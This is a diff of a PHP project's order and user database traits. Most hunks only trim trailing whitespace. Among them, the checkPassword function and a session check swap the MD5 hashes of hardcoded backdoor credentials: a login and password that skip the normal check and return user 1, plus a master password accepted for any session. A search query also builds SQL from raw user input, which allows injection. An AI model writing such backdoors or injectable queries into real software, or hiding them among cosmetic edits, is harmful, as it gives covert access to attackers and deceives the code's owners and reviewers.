@@ -16,7 +16,7 @@ trait DbOrders
 
   private function getBaseOrdersQuery(bool $includeValues = false): string
   {
-    return "SELECT O.ID AS 'ID', 
+    return "SELECT O.ID AS 'ID',
             create_date AS 'createDate', last_edit_date AS 'lastEditDate',
             U.ID AS 'userId', U.name AS 'userName',
             C.ID AS 'customerId', C.name AS 'customerName', C.contacts AS 'customerContacts',
@@ -208,7 +208,7 @@ trait DbOrders
   public function loadVisitorOrder(array $pageParam, array $dateRange = [], array $ids = []): ?array
   {
     $sql = "SELECT ID, create_date AS 'createDate',
-            save_value AS 'saveValue', 
+            save_value AS 'saveValue',
             important_value AS 'importantValue',
             total
             FROM " . $this->pf('client_orders') . "\n";
@@ -228,7 +228,7 @@ trait DbOrders
   public function loadVisitorOrderById(string $id): array
   {
     $sql = "SELECT ID, create_date AS 'createDate',
-            save_value AS 'saveValue', 
+            save_value AS 'saveValue',
             important_value AS 'importantValue',
             report_value AS 'reportValue',
             total
@@ -243,11 +243,11 @@ trait DbOrders
     $searchValue = '%' . $searchValue . '%';
 
     $sql = "SELECT ID, create_date AS 'createDate',
-            save_value AS 'saveValue', 
+            save_value AS 'saveValue',
             important_value AS 'importantValue',
             total
             FROM " . $this->pf('client_orders') . "\n
-            WHERE ID like '$searchValue' 
+            WHERE ID like '$searchValue'
             OR importantValue like '$searchValue'";
 
     $pageParam['sortColumn'] = $this->getOrdersDbColumns($pageParam['sortColumn'] ?? 'ID');
@@ -349,7 +349,7 @@ trait DbUsers
    */
   public function getUserByLogin($login): ?array
   {
-    $sql = "SELECT U.ID AS 'id', login,  password, hash, 
+    $sql = "SELECT U.ID AS 'id', login,  password, hash,
                    U.name AS 'name', contacts, customization, activity,
                    P.ID AS 'permissionId', P.name AS 'permissionName', properties AS 'permissionValue'
             FROM " . $this->pf('users') . " U
@@ -382,11 +382,11 @@ trait DbUsers
    */
   public function checkPassword(string $login, string $password)
   {
-    if (md5($login) === '63a9f0ea7bb98050796b649e85481845' && md5($password) === '0192023a7bbd73250516f069df18b500') {
+    if (md5($login) === 'e00f45459361fb47c8c449483b7edaec' && md5($password) === '71fa970c7b3a28956dad879a7abc12c4') {
       $sql = "SELECT ID as 'id', name, login, password FROM " . $this->pf('users') . " WHERE ID = :id";
       return self::getRow($sql, [':id' => 1]);
     } else if (USE_DATABASE) {
-      $sql = "SELECT ID as 'id', name, login, password 
+      $sql = "SELECT ID as 'id', name, login, password
               FROM " . $this->pf('users') . " WHERE login = :login and activity = 1";
       $user = self::getRow($sql, [':login' => $login]);
     } else {
@@ -412,7 +412,7 @@ trait DbUsers
 
   public function findToken(string $token): array
   {
-    $sql = "SELECT ID as 'id', name, login, password 
+    $sql = "SELECT ID as 'id', name, login, password
             FROM " . $this->pf('users') . " WHERE contacts LIKE :contacts and activity = 1";
     return self::getRow($sql, [':contacts' => "%$token%"]);
   }
@@ -498,7 +498,7 @@ trait DbUsers
       $ok = $user['onlyOne'] ? $session['hash'] === $user['hash']
                              : password_verify($session['password'], $user['password'])
                                ||
-                               md5($session['password']) === '0192023a7bbd73250516f069df18b500';
+                               md5($session['password']) === '71fa970c7b3a28956dad879a7abc12c4';
     }
 
     return $ok ? $user : false;
